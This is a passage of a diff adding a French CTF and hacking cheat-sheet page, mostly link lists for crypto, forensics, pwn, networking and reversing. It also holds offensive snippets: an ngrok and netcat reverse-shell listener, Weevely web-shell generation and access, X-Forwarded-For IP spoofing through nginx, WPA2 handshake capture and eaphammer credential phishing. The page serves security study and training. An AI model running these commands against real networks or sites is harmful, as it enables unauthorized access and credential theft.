class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import hmac, hashlib, base64; print(base64.urlsafe_b64encode(hmac.new(&lt;key&gt;, &lt;token&gt;, hashlib.sha256).digest()).replace(&#34;=&#34;, &#34;&#34;))&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p><a href="https://hashes.com" target="_blank" rel="noopener noreffer ">Hashes.com</a></p>
+</li>
+<li>
+<p><a href="https://www.dcode.fr/" target="_blank" rel="noopener noreffer ">Dcode</a></p>
+</li>
+<li>
+<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreffer ">Cyberchef</a> : Divers encodages/hashs et autres</p>
+</li>
+<li>
+<p><a href="https://www.alpertron.com.ar/ECM.HTM" target="_blank" rel="noopener noreffer ">Alpertron</a> : RSA (en + de <code>factordb</code> et <code>simpy</code>)</p>
+</li>
+<li>
+<p><a href="https://github.com/tna0y/Python-random-module-cracker" target="_blank" rel="noopener noreffer ">https://github.com/tna0y/Python-random-module-cracker</a></p>
+</li>
+<li>
+<p><a href="https://gmpy2.readthedocs.io/en/latest/overview.html" target="_blank" rel="noopener noreffer ">Gmpy2</a></p>
+</li>
+<li>
+<p><a href="https://pycryptodome.readthedocs.io/en/latest/src/api.html" target="_blank" rel="noopener noreffer ">Pycryptodome</a></p>
+</li>
+<li>
+<p><a href="https://doc.sagemath.org/html/en/reference/arithmetic_curves/sage/schemes/elliptic_curves/constructor.html" target="_blank" rel="noopener noreffer ">Sage (ECC)</a></p>
+</li>
+<li>
+<p><a href="https://docs.sympy.org/latest/modules/polys/reference.html" target="_blank" rel="noopener noreffer ">Sympy (docs)</a></p>
+</li>
+</ul>
+<h3 id="cours-cryptohack-starters">Cours: Cryptohack Starters</h3>
+<ul>
+<li><a href="https://github.com/0x14mth3n1ght/Hacking/tree/main/crypto/elliptic_curves" target="_blank" rel="noopener noreffer ">https://github.com/0x14mth3n1ght/Hacking/tree/main/crypto/elliptic_curves</a></li>
+</ul>
+<h2 id="forensic">Forensic</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/8J9Eq3hpMOw" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="analyse-de-logs">Analyse de logs</h3>
+<ul>
+<li><a href="https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/forensic/weird_shell" target="_blank" rel="noopener noreffer ">https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/forensic/weird_shell</a></li>
+</ul>
+<h3 id="exfiltration">Exfiltration</h3>
+<ul>
+<li><a href="https://tshark.dev/" target="_blank" rel="noopener noreffer ">https://tshark.dev/</a></li>
+<li><a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener noreffer ">https://wiki.wireshark.org/SampleCaptures</a></li>
+</ul>
+<h3 id="tools">Tools:</h3>
+<ul>
+<li>
+<p><a href="https://www.sleuthkit.org/" target="_blank" rel="noopener noreffer ">Autopsy</a></p>
+</li>
+<li>
+<p><code>binwalk</code> (<code>binwalk -e &lt;file&gt;</code> , <code>binwalk -dd=&quot;*&quot; &lt;file&gt;</code>)</p>
+</li>
+<li>
+<p><a href="https://github.com/wagoodman/dive" target="_blank" rel="noopener noreffer ">Dive (docker)</a></p>
+</li>
+<li>
+<p><code>photorec</code> (récupérer les fichiers supprimés (unlinkés)</p>
+</li>
+<li>
+<p><a href="https://github.com/corkami/docs/blob/master/PDF/PDF.md" target="_blank" rel="noopener noreffer ">https://github.com/corkami/docs/blob/master/PDF/PDF.md</a></p>
+</li>
+<li>
+<p><code>volatility</code>:
+- profils linux avec <a href="https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/HackSecuReims/forensic/memdump" target="_blank" rel="noopener noreffer ">Vol2 (HackSecuReims)</a></p>
+</li>
+</ul>
+<p><code>Une fois setup ci dessous effectué</code></p>
+<p><a href="https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html#" target="_blank" rel="noopener noreffer ">https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html#</a></p>
+<h3 id="profils-linux-vol3">Profils Linux (Vol3)</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python ~/volatility3/vol.py -f memory.dmp banners.Banners
+</span></span><span class="line"><span class="cl"><span class="c1"># Linux 5.x-y</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="c"># Version souhaitée de l&#39;OS</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> debian:bullseye</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ARG</span> <span class="nv">KERNEL_VERSION</span><span class="o">=</span><span class="m">5</span>.10.0-21<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ARG</span> <span class="nv">KERNEL_ARCH</span><span class="o">=</span>amd64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Update et installation des dépendances nécessaires à Dwarf2json</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># /!\</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Il faut charger l&#39;image `-dbg` avec la version trouvée pour avoir le fichier DWARF</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt update<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt install -y <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  linux-image-<span class="si">${</span><span class="nv">KERNEL_VERSION</span><span class="si">}</span>-<span class="si">${</span><span class="nv">KERNEL_ARCH</span><span class="si">}</span>-dbg <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  linux-headers-<span class="si">${</span><span class="nv">KERNEL_VERSION</span><span class="si">}</span>-<span class="si">${</span><span class="nv">KERNEL_ARCH</span><span class="si">}</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  build-essential golang-go git make<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Volatility3</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Récupération de Dwarf2json</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> git clone https://github.com/volatilityfoundation/dwarf2json<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> dwarf2json</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># On build puis on génère le fichier JSON depuis le fichier DWARF</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> go mod download github.com/spf13/pflag<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> go build<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-<span class="si">${</span><span class="nv">KERNEL_VERSION</span><span class="si">}</span>-<span class="si">${</span><span class="nv">KERNEL_ARCH</span><span class="si">}</span> &gt; linux-image-<span class="si">${</span><span class="nv">KERNEL_VERSION</span><span class="si">}</span>-<span class="si">${</span><span class="nv">KERNEL_ARCH</span><span class="si">}</span>.json<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;sleep&#34;</span><span class="p">,</span> <span class="s2">&#34;3600&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker build -t dwarf2json .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">CONTAINER_ID</span><span class="o">=</span><span class="k">$(</span>docker run -ti --rm -d dwarf2json<span class="k">)</span>
+</span></span><span class="line"><span class="cl">docker cp <span class="nv">$CONTAINER_ID</span>:/dwarf2json/linux-image-5.10.0-21-amd64.json volatility3/volatility3/symbols
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">docker rm -f <span class="nv">$CONTAINER_ID</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python volatility3/vol.py -f memory.dmp linux.bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="profils-android">Profils Android</h3>
+<p><a href="https://github.com/504ensicsLabs/LiME" target="_blank" rel="noopener noreffer ">https://github.com/504ensicsLabs/LiME</a></p>
+<h2 id="pwn">Pwn</h2>
+<p>Voir <code>reverse</code> pour les bases.</p>
+<h3 id="documentation-2">Documentation</h3>
+<ul>
+<li>
+<p><a href="https://guyinatuxedo.github.io/" target="_blank" rel="noopener noreffer ">https://guyinatuxedo.github.io/</a></p>
+</li>
+<li>
+<p>Vidéos/Plateformes/Docs: <a href="https://mksec.fr/tricks/pwn_ressources/" target="_blank" rel="noopener noreffer ">https://mksec.fr/tricks/pwn_ressources/</a></p>
+</li>
+<li>
+<p>Overview du pwn en fr: <a href="https://own2pwn.fr" target="_blank" rel="noopener noreffer ">https://own2pwn.fr</a></p>
+</li>
+<li>
+<p><a href="https://doc.lagout.org/security/The%20Shellcoder%E2%80%99s%20Handbook.pdf" target="_blank" rel="noopener noreffer ">The Shellcoder Handbook</a></p>
+</li>
+</ul>
+<h3 id="armmipsriscv">ARM,MIPS,RISCV</h3>
+<h3 id="arguments-et-payload">Arguments et payload</h3>
+<p><a href="https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection" target="_blank" rel="noopener noreffer ">https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection</a></p>
+<h3 id="pilestack">Pile/Stack</h3>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/WG7QtpRPArg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p><a href="https://thinkloveshare.com/hacking/pwn_1of4_buffer_overflow/" target="_blank" rel="noopener noreffer ">https://thinkloveshare.com/hacking/pwn_1of4_buffer_overflow/</a></p>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack" target="_blank" rel="noopener noreffer ">https://ir0nstone.gitbook.io/notes/types/stack</a></p>
+<h3 id="protections">Protections</h3>
+<ul>
+<li>
+<p><a href="https://learn-cyber.net/article/What%27s-That-Preventing-Your-Exploit" target="_blank" rel="noopener noreffer ">https://learn-cyber.net/article/What's-That-Preventing-Your-Exploit</a></p>
+</li>
+<li>
+<p><code>ASLR</code>: randomise base address -&gt; Ret2libc</p>
+</li>
+<li>
+<p><code>PIE</code>: randomise offset -&gt; Leak fonction (format string)</p>
+</li>
+<li>
+<p><code>CANARY ou SSP</code>: <a href="https://learn-cyber.net/article/Understanding-and-Defeating-the-Canary" target="_blank" rel="noopener noreffer ">https://learn-cyber.net/article/Understanding-and-Defeating-the-Canary</a></p>
+</li>
+</ul>
+<h3 id="format-strings">Format Strings</h3>
+<ul>
+<li><a href="https://learn-cyber.net/article/Format-String-Vulnerabilities" target="_blank" rel="noopener noreffer ">https://learn-cyber.net/article/Format-String-Vulnerabilities</a></li>
+<li><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank" rel="noopener noreffer ">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
+<li><a href="https://axcheron.github.io/exploit-101-format-strings/" target="_blank" rel="noopener noreffer ">https://axcheron.github.io/exploit-101-format-strings/</a></li>
+</ul>
+<h3 id="tasheap">Tas/Heap</h3>
+<ul>
+<li>
+<p><a href="https://samwho.dev/memory-allocation/" target="_blank" rel="noopener noreffer ">https://samwho.dev/memory-allocation/</a></p>
+</li>
+<li>
+<p><a href="https://heap-exploitation.dhavalkapil.com/attacks/first_fit" target="_blank" rel="noopener noreffer ">https://heap-exploitation.dhavalkapil.com/attacks/first_fit</a></p>
+</li>
+<li>
+<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/" target="_blank" rel="noopener noreffer ">https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/</a></p>
+</li>
+</ul>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/PFqEKkj7wWs" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/o-nRssrHNMw" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<ul>
+<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener noreffer ">https://github.com/shellphish/how2heap</a></li>
+</ul>
+<h3 id="kernel">Kernel</h3>
+<ul>
+<li>
+<p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" target="_blank" rel="noopener noreffer ">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p>
+</li>
+<li>
+<p>Kernelmap interactive: <a href="https://makelinux.github.io/kernel/map/" target="_blank" rel="noopener noreffer ">https://makelinux.github.io/kernel/map/</a></p>
+</li>
+<li>
+<p>Kernel: <a href="https://0xax.gitbooks.io/linux-insides/content/" target="_blank" rel="noopener noreffer ">https://0xax.gitbooks.io/linux-insides/content/</a></p>
+</li>
+</ul>
+<h3 id="débuggers-pour-binaires-elf-linux-plus-courants-en-pwn">Débuggers (pour binaires ELF (Linux), plus courants en pwn)</h3>
+<p>voir <code>../tutos</code> (cours/prog C)</p>
+<ul>
+<li>
+<p><a href="https://tc.gts3.org/cs6265/2019/tut/tut01-warmup1.html" target="_blank" rel="noopener noreffer ">gdb pour pwn</a> , pour la <strong>stack</strong> <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener noreffer ">gdb-gef</a>, pour la <strong>heap</strong> <a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md" target="_blank" rel="noopener noreffer ">pwndbg</a></p>
+</li>
+<li>
+<p><code>r2</code>: <a href="https://github.com/radareorg/radare2" target="_blank" rel="noopener noreffer ">https://github.com/radareorg/radare2</a></p>
+</li>
+</ul>
+<h3 id="plateformes">Plateformes</h3>
+<ul>
+<li>
+<p><a href="https://deusx64.ai/" target="_blank" rel="noopener noreffer ">https://deusx64.ai/</a></p>
+</li>
+<li>
+<p><a href="https://exploit.education/" target="_blank" rel="noopener noreffer ">https://exploit.education/</a></p>
+</li>
+<li>
+<p><a href="https://pwn.college/" target="_blank" rel="noopener noreffer ">https://pwn.college/</a></p>
+</li>
+<li>
+<p><a href="https://ropemporium.com/" target="_blank" rel="noopener noreffer ">https://ropemporium.com/</a></p>
+</li>
+</ul>
+<h2 id="reseau">Reseau</h2>
+<p>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/Oc7Ts8tVjyE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/B1vqKQIPxr0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</p>
+<h3 id="documentation-3">Documentation</h3>
+<ul>
+<li><a href="https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/" target="_blank" rel="noopener noreffer ">https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/</a></li>
+<li><a href="https://ctf-wiki.mahaloz.re/misc/traffic/introduction/" target="_blank" rel="noopener noreffer ">https://ctf-wiki.mahaloz.re/misc/traffic/introduction/</a></li>
+<li><a href="https://cheatsheet.haax.fr/shells-methods/reverse/" target="_blank" rel="noopener noreffer ">https://cheatsheet.haax.fr/shells-methods/reverse/</a></li>
+<li><a href="https://github.com/sergiomarotco/Network-segmentation-cheat-sheet" target="_blank" rel="noopener noreffer ">https://github.com/sergiomarotco/Network-segmentation-cheat-sheet</a></li>
+<li><a href="https://github.com/V0lk3n/WirelessPentesting-CheatSheet" target="_blank" rel="noopener noreffer ">https://github.com/V0lk3n/WirelessPentesting-CheatSheet</a></li>
+</ul>
+<h3 id="tools-1">Tools</h3>
+<ul>
+<li><a href="https://www.bettercap.org/installation/" target="_blank" rel="noopener noreffer ">Bettercap</a></li>
+<li><a href="https://github.com/s0lst1c3/eaphammer" target="_blank" rel="noopener noreffer ">Eaphammer</a></li>
+<li><a href="https://www.gasmi.net/hpd/" target="_blank" rel="noopener noreffer ">Hex Packet Decoder</a></li>
+<li><a href="https://ngrok.com/" target="_blank" rel="noopener noreffer ">Ngrok</a></li>
+<li><a href="https://revshells.com" target="_blank" rel="noopener noreffer ">Revshells</a></li>
+<li><a href="https://tshark.dev/" target="_blank" rel="noopener noreffer ">Tshark</a> , <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener noreffer ">https://wiki.wireshark.org/SampleCaptures</a></li>
+</ul>
+<h3 id="curl">Curl</h3>
+<p><code>curl  is a tool for transferring data from or to a server. It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP,  SMB, SMBS, SMTP, SMTPS, TELNET or TFTP. The command is designed to work without user interaction.</code></p>
+<h3 id="http">HTTP</h3>
+<p><a href="https://gist.github.com/subfuzion/08c5d85437d5d4f00e58" target="_blank" rel="noopener noreffer ">Curl Options &amp; POST</a></p>
+<h3 id="ldap">LDAP</h3>
+<ul>
+<li><a href="https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html" target="_blank" rel="noopener noreffer ">https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html</a></li>
+<li><a href="https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command" target="_blank" rel="noopener noreffer ">https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command</a></li>
+</ul>
+<h3 id="reverseweb-shell">Reverse/Web shell</h3>
+<p>Configurer son /etc/hosts</p>
+<ul>
+<li><a href="https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address" target="_blank" rel="noopener noreffer ">https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address</a></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/hosts
+</span></span><span class="line"><span class="cl">ip DOMAIN
+</span></span><span class="line"><span class="cl">ip DC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Revere shell - Ngrok</code></p>
+<p>(Non nécessaire si l&rsquo;attaquant et la cible sont sur le même réseau)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#term1</span>
+</span></span><span class="line"><span class="cl">ngrok config add-authtoken TOKEN
+</span></span><span class="line"><span class="cl">ngrok tcp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Forwarding tcp://5.tcp.eu.ngrok.io:16833 -&gt; localhost:4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#term2</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Web shell - Weevely</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">weevely generate password shell.php5
+</span></span><span class="line"><span class="cl">weevely http://10.10.97.185/uploads/shell.php5 password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="reverse-proxy">Reverse Proxy</h3>
+<p><code>Ip Spoofing</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nginx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo vim etc/nginx/sites-available/default
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">server {
+</span></span><span class="line"><span class="cl">   ...
+</span></span><span class="line"><span class="cl">         # remplacer location /
+</span></span><span class="line"><span class="cl">	location / {
+</span></span><span class="line"><span class="cl">                proxy_pass http://vulnerable-site.org ; 
+</span></span><span class="line"><span class="cl">                proxy_set_header X-Forwarded-For $remote_addr ;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">   ...
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl restart nginx
+</span></span><span class="line"><span class="cl">firefox <span class="k">$(</span>ip a s eth0 <span class="p">|</span> awk -F<span class="s1">&#39;[/ ]+&#39;</span> <span class="s1">&#39;/inet[^6]/{print $3}&#39;</span><span class="k">)</span>/page <span class="c1">#http://vulnerable-site.org/page</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="wifi">Wifi</h3>
+<p><code>Arp Spoofing</code></p>
+<ul>
+<li><a href="https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network" target="_blank" rel="noopener noreffer ">https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network</a></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ip l <span class="nb">set</span> wlanx down
+</span></span><span class="line"><span class="cl">sudo iw wlanx <span class="nb">set</span> monitor none
+</span></span><span class="line"><span class="cl">sudo ip l <span class="nb">set</span> wlanx up
+</span></span><span class="line"><span class="cl">sudo iw wlanx info
+</span></span><span class="line"><span class="cl">sudo wireshark<span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><a href="https://dl.aircrack-ng.org/breakingwepandwpa.pdf" target="_blank" rel="noopener noreffer ">https://dl.aircrack-ng.org/breakingwepandwpa.pdf</a></li>
+</ul>
+<p><code>WPA2 - PSK</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo docker run -it --privileged --rm --net<span class="o">=</span>host bettercap/bettercap -iface wlanx
+</span></span><span class="line"><span class="cl"><span class="c1">#wifi.recon help</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wpapcap2john bettercap-wifi-handshakes.pcap
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><a href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/" target="_blank" rel="noopener noreffer ">https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/</a></li>
+</ul>
+<p><code>WPA2 - EAP</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 ./eaphammer –cert-wizard
+</span></span><span class="line"><span class="cl">sudo python3 ./eaphammer -i wlan6 --creds -e <span class="s2">&#34;xxx&#34;</span> -b xx:xx:xx:xx:xx:xx <span class="c1">#BSSID /MAC</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reverse">Reverse</h2>
+<h3 id="introduction--assembleur-x86">Introduction:  Assembleur x86</h3>
+<ul>
+<li><a href="https://beta.hackndo.com/assembly-basics/" target="_blank" rel="noopener noreffer ">https://beta.hackndo.com/assembly-basics/</a></li>
+</ul>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/tmtXn2UXR3g" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h3 id="documentation-4">Documentation</h3>
+<ul>
+<li>
+<p><a href="https://www.begin.re" target="_blank" rel="noopener noreffer ">https://www.begin.re</a></p>
+</li>
+<li>
